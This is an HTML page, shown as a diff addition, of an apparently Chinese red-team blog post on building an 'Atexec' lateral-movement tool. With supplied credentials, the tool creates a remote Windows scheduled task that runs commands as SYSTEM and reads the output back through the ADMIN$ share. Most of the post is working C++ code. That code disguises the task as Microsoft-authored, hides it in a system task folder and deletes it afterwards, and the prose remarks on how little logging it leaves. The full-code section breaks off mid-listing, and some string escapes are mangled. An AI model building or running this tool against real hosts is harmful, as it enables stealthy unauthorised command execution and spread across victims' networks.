@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>如何实现一个Atexec « 倾旋的博客</title>
+  <meta name="description" content="0x01 Atexec，一种横向方式Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与时间有关。Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。0x02 执行过程首先，我们用成品来进行一次命令执行：执...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2020-06-28/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">如何实现一个Atexec</h1>
+    <p class="post-meta">Jun 28, 2020</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="0x01-atexec一种横向方式">0x01 Atexec，一种横向方式</h2>
+
+<p>Atexec是一个除了Psexec以外，被高频使用的横向方式，该技术手段主要通过任务计划实现，与<strong>时间</strong>有关。</p>
+
+<p>Atexec的主要特点是通过135端口进行任务计划任务的创建，同时通过445端口进行SMB认证，取回命令执行的结果。</p>
+
+<h2 id="0x02-执行过程">0x02 执行过程</h2>
+
+<p>首先，我们用成品来进行一次命令执行：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0d16f01986d829bd82e3eacf4995a9a5.png" alt="2020-06-28-22-03-13"></p>
+
+<p>执行完成，能够看到whoami的结果是SYSTEM权限，通过流量上分析：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f4d0641851f1119759d61edd77a789b5.png" alt="2020-06-28-22-03-27"></p>
+
+<p>首先，源主机192.168.164.1向目标主机192.168.164.140的135端口建立连接，由于是RPC协议，所以会进行一次端口随机的协商，于是源主机端口变成57523，目标主机源端口变成49154，这使得流量设备在数据传输上不能轻易的监控传输内容。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/42a889308009de6201a6ebd7d17a0a58.png" alt="2020-06-28-22-03-40"></p>
+
+<p>紧接着，源主机向目标主机进行SMB认证，完成文件的读取（命令执行结果），最终断开连接。</p>
+
+<p>在操作系统的事件查看器中，<strong>（默认情况下）</strong>仅仅捕获了几条Windows认证的日志，关于服务、文件操作、应用程序等都没有相关日志。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/0b65e37d47b0c29c001d0d4b6d5d67e8.png" alt="2020-06-28-22-03-53"></p>
+
+<h2 id="0x03-实现过程">0x03 实现过程</h2>
+
+<p>要实现一个Atexec并不难，首先需要梳理一下实现思路，第一步需要根据提供的凭证创建任务计划，然后程序等待任务计划完成后，获取任务计划的执行结果。</p>
+
+<h3 id="如何远程创建任务计划">如何远程创建任务计划？</h3>
+
+<p>这里主要涉及到COM组件的操作，我用封装函数的方式来实现使得程序可读性变高。</p>
+
+<p><strong>使用凭证连接远程主机的任务计划接口：</strong></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">ConnectTaskServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwDomain</span><span class="p">,</span><span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// 初始化COM组件</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">CoInitializeEx</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>
+	<span class="c1">// 设置组件安全等级</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">CoInitializeSecurity</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">RPC_C_AUTHN_LEVEL_PKT_PRIVACY</span><span class="p">,</span> <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="c1">// 创建任务服务容器</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">CLSID_TaskScheduler</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">IID_ITaskService</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pService</span><span class="p">);</span>
+	<span class="c1">// 连接目标服务器为远程连接或本地服务器</span>
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">pService</span><span class="o">-&gt;</span><span class="n">Connect</span><span class="p">(</span><span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwsHost</span><span class="p">),</span> <span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwsUserName</span><span class="p">),</span> <span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwDomain</span><span class="p">),</span> <span class="n">_variant_t</span><span class="p">(</span><span class="n">lpwsPassword</span><span class="p">));</span>	<span class="c1">//默认本地</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"ITaskService::Connect failed: %x </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hr</span><span class="p">);</span>
+		
+		<span class="n">pService</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+		<span class="n">CoUninitialize</span><span class="p">();</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/_taskschd/">Task Scheduler</a>提供了许多函数及接口来操作任务计划，但是凡是涉及COM组件的操作，都变得有些复杂，但至少实现Atexec涉及到的知识点并不多。</p>
+
+<p><strong>如何创建任务计划：</strong></p>
+
+<p>这里主要是利用COM对象的接口函数来创建触发器、设置触发时间、执行频次等。</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreatTask</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">wTaskName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">wCommand</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">wOutPutPath</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">CurrentTime</span><span class="p">;</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">CommandArgs</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"/c "</span><span class="p">));</span>
+	<span class="n">CommandArgs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">wCommand</span><span class="p">);</span>
+	<span class="n">CommandArgs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">" &gt;"</span><span class="p">));</span>
+	<span class="n">CommandArgs</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">wOutPutPath</span><span class="p">);</span>
+
+	<span class="n">wstring</span> <span class="n">wstrExePath</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"C:\Windows\System32\cmd.exe"</span><span class="p">));</span>
+	
+	<span class="c1">// 获取任务文件夹并在其中创建任务</span>
+	<span class="n">pService</span><span class="o">-&gt;</span><span class="n">GetFolder</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"\Microsoft\Windows\AppID"</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">pRootFolder</span><span class="p">);</span>
+	<span class="c1">// 如果存在同名任务，删除它</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">DeleteTask</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wTaskName</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="c1">// 使用ITaskDefinition对象定义任务相关信息</span>
+	<span class="n">ITaskDefinition</span><span class="o">*</span> <span class="n">pTask</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pService</span><span class="o">-&gt;</span><span class="n">NewTask</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pTask</span><span class="p">);</span>
+
+	<span class="c1">// 使用IRegistrationInfo对象对任务的基础信息填充</span>
+	<span class="n">IRegistrationInfo</span><span class="o">*</span> <span class="n">pRegInfo</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_RegistrationInfo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pRegInfo</span><span class="p">);</span>
+	<span class="n">pRegInfo</span><span class="o">-&gt;</span><span class="n">put_Author</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"Microsoft Corporation"</span><span class="p">));</span>
+
+	<span class="c1">// 创建任务的安全凭证</span>
+	<span class="n">IPrincipal</span><span class="o">*</span> <span class="n">pPrincipal</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Principal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pPrincipal</span><span class="p">);</span>
+
+	<span class="c1">// 设置规则为交互式登录</span>
+	<span class="n">pPrincipal</span><span class="o">-&gt;</span><span class="n">put_LogonType</span><span class="p">(</span><span class="n">TASK_LOGON_INTERACTIVE_TOKEN</span><span class="p">);</span>
+  <span class="c1">// 指定执行用户</span>
+	<span class="n">pPrincipal</span><span class="o">-&gt;</span><span class="n">put_UserId</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"NT AUTHORITY\SYSTEM"</span><span class="p">));</span>
+
+	<span class="c1">// 创建任务的设置信息</span>
+	<span class="n">ITaskSettings</span><span class="o">*</span> <span class="n">pTaskSettings</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Settings</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pTaskSettings</span><span class="p">);</span>
+	<span class="c1">// 为设置信息赋值</span>
+	<span class="n">pTaskSettings</span><span class="o">-&gt;</span><span class="n">put_StartWhenAvailable</span><span class="p">(</span><span class="n">VARIANT_TRUE</span><span class="p">);</span>
+	<span class="c1">// 设置任务的idle设置</span>
+	<span class="n">IIdleSettings</span><span class="o">*</span> <span class="n">pIdleSettings</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTaskSettings</span><span class="o">-&gt;</span><span class="n">get_IdleSettings</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pIdleSettings</span><span class="p">);</span>
+	<span class="n">pIdleSettings</span><span class="o">-&gt;</span><span class="n">put_WaitTimeout</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"PT1M"</span><span class="p">));</span>
+
+	<span class="c1">//创建触发器</span>
+	<span class="n">ITriggerCollection</span><span class="o">*</span> <span class="n">pTriggerCollection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Triggers</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pTriggerCollection</span><span class="p">);</span>
+	<span class="n">ITrigger</span><span class="o">*</span> <span class="n">pTrigger</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="n">hr</span> <span class="o">=</span> <span class="n">pTriggerCollection</span><span class="o">-&gt;</span><span class="n">Create</span><span class="p">(</span><span class="n">TASK_TRIGGER_TIME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pTrigger</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hr</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Cannot create the trigger: %x"</span><span class="p">,</span> <span class="n">hr</span><span class="p">);</span>
+		<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+		<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+		<span class="n">CoUninitialize</span><span class="p">();</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// 设置时间触发器</span>
+	<span class="n">ITimeTrigger</span><span class="o">*</span> <span class="n">pTimeTrigger</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTrigger</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span><span class="n">IID_ITimeTrigger</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pTimeTrigger</span><span class="p">);</span>
+	<span class="n">pTimeTrigger</span><span class="o">-&gt;</span><span class="n">put_Id</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"Trigger2"</span><span class="p">));</span>
+	<span class="n">CurrentTime</span> <span class="o">=</span> <span class="n">GetTime</span><span class="p">();</span>
+	<span class="c1">// 在10秒后执行</span>
+	<span class="n">pTimeTrigger</span><span class="o">-&gt;</span><span class="n">put_StartBoundary</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">CurrentTime</span><span class="p">.</span><span class="n">data</span><span class="p">()));</span>
+	<span class="n">pTimeTrigger</span><span class="o">-&gt;</span><span class="n">put_EndBoundary</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"2089-03-26T13\:00\:00"</span><span class="p">));</span>
+	<span class="c1">// 创建任务动作</span>
+	<span class="n">IActionCollection</span><span class="o">*</span> <span class="n">pActionCollection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pTask</span><span class="o">-&gt;</span><span class="n">get_Actions</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pActionCollection</span><span class="p">);</span>
+	<span class="n">IAction</span><span class="o">*</span> <span class="n">pAction</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pActionCollection</span><span class="o">-&gt;</span><span class="n">Create</span><span class="p">(</span><span class="n">TASK_ACTION_EXEC</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pAction</span><span class="p">);</span>
+	<span class="n">IExecAction</span><span class="o">*</span> <span class="n">pExecAction</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="c1">// 出入执行命令及参数</span>
+	<span class="n">pAction</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span><span class="n">IID_IExecAction</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pExecAction</span><span class="p">);</span>
+	<span class="n">pExecAction</span><span class="o">-&gt;</span><span class="n">put_Path</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wstrExePath</span><span class="p">.</span><span class="n">c_str</span><span class="p">()));</span>
+	<span class="n">pExecAction</span><span class="o">-&gt;</span><span class="n">put_Arguments</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">CommandArgs</span><span class="p">.</span><span class="n">data</span><span class="p">()));</span>
+
+	<span class="n">IRegisteredTask</span><span class="o">*</span> <span class="n">pRegistredTask</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">RegisterTaskDefinition</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wTaskName</span><span class="p">),</span> <span class="n">pTask</span><span class="p">,</span> <span class="n">TASK_CREATE_OR_UPDATE</span><span class="p">,</span>
+		<span class="n">_variant_t</span><span class="p">(),</span> <span class="n">_variant_t</span><span class="p">(),</span> <span class="n">TASK_LOGON_INTERACTIVE_TOKEN</span><span class="p">,</span> <span class="n">_variant_t</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">pRegistredTask</span><span class="p">);</span>
+	<span class="n">Sleep</span><span class="p">(</span><span class="mi">10</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">);</span>
+	<span class="c1">// 结束时删除任务</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">DeleteTask</span><span class="p">(</span><span class="n">_bstr_t</span><span class="p">(</span><span class="n">wTaskName</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">pRootFolder</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+	<span class="n">pService</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+	<span class="n">CoUninitialize</span><span class="p">();</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// 获取未来10秒后的时间</span>
+<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="nf">GetTime</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">WCHAR</span> <span class="n">CurrentTime</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+	<span class="n">SYSTEMTIME</span> <span class="n">sys</span><span class="p">;</span>
+	<span class="n">GetLocalTime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sys</span><span class="p">);</span>
+	<span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span> <span class="o">+=</span> <span class="mi">10</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span> <span class="o">&gt;=</span> <span class="mi">60</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">sys</span><span class="p">.</span><span class="n">wMinute</span><span class="o">++</span><span class="p">;</span>
+		<span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span> <span class="o">-=</span> <span class="mi">60</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">wsprintf</span><span class="p">(</span><span class="n">CurrentTime</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"%4d-%02d-%02dT%02d:%02d:%02d"</span><span class="p">),</span> <span class="n">sys</span><span class="p">.</span><span class="n">wYear</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wMonth</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wDay</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wHour</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wMinute</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">wSecond</span><span class="p">);</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wstring</span> <span class="n">returnTime</span><span class="p">(</span><span class="n">CurrentTime</span><span class="p">);</span>
+	<span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">returnTime</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
+	<span class="k">return</span> <span class="n">returnTime</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>可以看到，这个函数中针对每个任务创建完成后，等待了大约10s来确保任务计划命令执行完毕，这就是我实现这个Atexec的一个缺点，其实还有更好的办法，就是每隔1s查询该任务计划的状态来确保任务计划执行。</p>
+
+<h3 id="如何获得执行结果">如何获得执行结果？</h3>
+
+<p>这里我主要采用的是<code class="language-plaintext highlighter-rouge">cmd /c command &gt;</code> 重定向到文件的方式，涉及到了SMB服务的连接、文件读取操作，这个和之前<a href="https://payloads.online/archivers/2020-04-02/1">如何实现一个Psexec</a>文中的内容有些相似。</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">ConnectSMBServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// 用于存放SMB共享资源格式</span>
+	<span class="n">PWCHAR</span> <span class="n">lpwsIPC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WCHAR</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+	<span class="n">DWORD</span> <span class="n">dwRetVal</span><span class="p">;</span> <span class="c1">// 函数返回值</span>
+	<span class="n">NETRESOURCE</span> <span class="n">nr</span><span class="p">;</span> <span class="c1">// 连接的详细信息</span>
+	<span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">;</span> <span class="c1">// 连接选项</span>
+
+	<span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">NETRESOURCE</span><span class="p">));</span>
+	<span class="n">swprintf</span><span class="p">(</span><span class="n">lpwsIPC</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"\%s</span><span class="se">\a</span><span class="s">dmin$"</span><span class="p">),</span> <span class="n">lpwsHost</span><span class="p">);</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">dwType</span> <span class="o">=</span> <span class="n">RESOURCETYPE_ANY</span><span class="p">;</span> <span class="c1">// 枚举所有资源</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">lpLocalName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">lpRemoteName</span> <span class="o">=</span> <span class="n">lpwsIPC</span><span class="p">;</span> <span class="c1">// 资源的网络名</span>
+	<span class="n">nr</span><span class="p">.</span><span class="n">lpProvider</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="c1">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span>
+	<span class="n">dwFlags</span> <span class="o">=</span> <span class="n">CONNECT_UPDATE_PROFILE</span><span class="p">;</span>
+
+	<span class="n">dwRetVal</span> <span class="o">=</span> <span class="n">WNetAddConnection2</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span> <span class="n">lpwsPassword</span><span class="p">,</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">dwFlags</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">dwRetVal</span> <span class="o">==</span> <span class="n">NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// 返回NO_ERROR则成功</span>
+		<span class="c1">// wprintf(L"Connection added to %s\n", nr.lpRemoteName);</span>
+		<span class="k">return</span> <span class="n">dwRetVal</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">wprintf</span><span class="p">(</span><span class="s">L"WNetAddConnection2 failed with error: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwRetVal</span><span class="p">);</span>
+	<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="nf">GetSMBServerFileContent</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsDstPath</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">DWORD</span> <span class="n">dwFileSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">PCHAR</span> <span class="n">readBuf</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">DWORD</span> <span class="n">dwReaded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">BOOL</span> <span class="n">bRet</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">lpwsDstPath</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"Can't Read File : %s </span><span class="se">\n</span><span class="s">"</span><span class="p">),</span> <span class="n">lpwsDstPath</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="c1">// 获取文件大小</span>
+	<span class="n">dwFileSize</span> <span class="o">=</span> <span class="n">GetFileSize</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="n">readBuf</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">);</span>
+	<span class="n">ReadFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">,</span> <span class="n">dwFileSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReaded</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"===========================</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">);</span>
+	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+	<span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_NO_SERIALIZE</span><span class="p">,</span> <span class="n">readBuf</span><span class="p">);</span>
+	<span class="n">wprintf</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">===========================</span><span class="se">\n</span><span class="s">"</span><span class="p">));</span>
+	<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>这里默认主要是将命令执行结果写入了ADMIN$共享目录下，当然还可以更改为其他的。</p>
+
+<h2 id="0x04-atexec完整代码">0x04 Atexec完整代码</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _WIN32_DCOM
+#define _CRT_SECURE_NO_WARNINGS   // 忽略老版本函数所提示的安全问题
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;comdef.h&gt;
+#include &lt;string&gt;
+#include &lt;time.h&gt;
+#include &lt;taskschd.h&gt;
+#include &lt;winnetwk.h&gt;
+</span>
+<span class="cp">#pragma comment(lib,"taskschd.lib")
+#pragma comment(lib,"comsupp.lib")
+#pragma comment(lib, "ws2_32")   
+#pragma comment(lib, "Mpr.lib")
+#pragma comment(lib,"Advapi32.lib")
+</span>
+<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+
+<span class="n">ITaskService</span><span class="o">*</span> <span class="n">pService</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">ITaskFolder</span><span class="o">*</span> <span class="n">pRootFolder</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">HRESULT</span> <span class="n">hr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
